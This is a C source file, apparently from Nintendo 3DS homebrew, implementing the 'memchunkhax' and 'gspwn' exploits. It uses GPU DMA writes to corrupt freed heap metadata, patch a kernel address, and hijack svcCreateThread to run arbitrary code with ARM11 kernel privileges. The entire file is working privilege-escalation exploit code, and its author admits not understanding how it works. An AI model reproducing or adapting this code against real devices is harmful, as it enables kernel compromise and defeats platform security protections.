#include "memchunkhax.h"

#include <stddef.h>
#include <stdint.h>
#include "firmcompat.h"
#include "appcompat.h"
#include "../draw.h"

void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_offset)
{
    // We'll use some memory to check the copy is being done right.
    void *check_mem = (void *)APP_CHECK_MEM;
    int *check_loc = (int *)(check_mem + check_offset);

    print("Doing gspwn copy");
    while(*check_loc != check) {
        print("Entering loop");

        memcpy(check_mem, check_mem, 0x10000);
        print("Done memcpy");

        GSPGPU_FlushDataCache(src, length);
        print("Flushed data cache");

        uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr1);
        print("Executed the weird thing");

        GSPGPU_FlushDataCache(check_mem, 0x10);
        print("Flushed data cache 2");

        uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)APP_GPUHANDLE, arr2);
        print("Executed the weird thing 2");

        memcpy(check_mem, check_mem, 0x10000);
        print("Done memcpy 2");
    }
}

__attribute__((naked))
void corrupted_svcCreateThread(__attribute__((unused)) void (*func)())
{
    __asm__ volatile ("svc 8");
}

void memchunk_arm11hax(void (*func)())
{
    // I need some memory locations to use
    uint32_t *mem_hax_mem = (uint32_t *)APP_MEM_HAX_MEM;
    uint32_t *mem_hax_mem_free = (uint32_t *)((uint32_t)mem_hax_mem + 0x1000);

    // All the documentation the rest of the code has is the prints.
    // I've never studied the logic of it, so I can't describe it in more detail.

    uint32_t tmp_addr;
    svcControlMemory(&tmp_addr, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
    print("Freed memory");

    // arm11_buffer is the location that is copied *from* when using gspwn_copy
    uint32_t *arm11_buffer = (uint32_t *)APP_ARM11_BUFFER;
    arm11_buffer[0] = 1;
    arm11_buffer[1] = fw->kernel_patch_address;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);
    print("Did gspwn copy");

    svcControlMemory(&tmp_addr, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);
    print("Triggered kernel write");

#ifdef ENTRY_SPIDER
    void *src = (void *)0x18000000;
    for (int i = 0; i < 3; i++) {  // Do it 3 times to be safe
        GSPGPU_FlushDataCache(src, 0x00038400);
        GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
        svcSleepThread(0x400000LL);
        GSPGPU_FlushDataCache(src, 0x00038400);
        GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
        svcSleepThread(0x400000LL);
    }
#endif

    print("Entering arm11");
    corrupted_svcCreateThread(func);
    print("Huh? I'm back?");
}
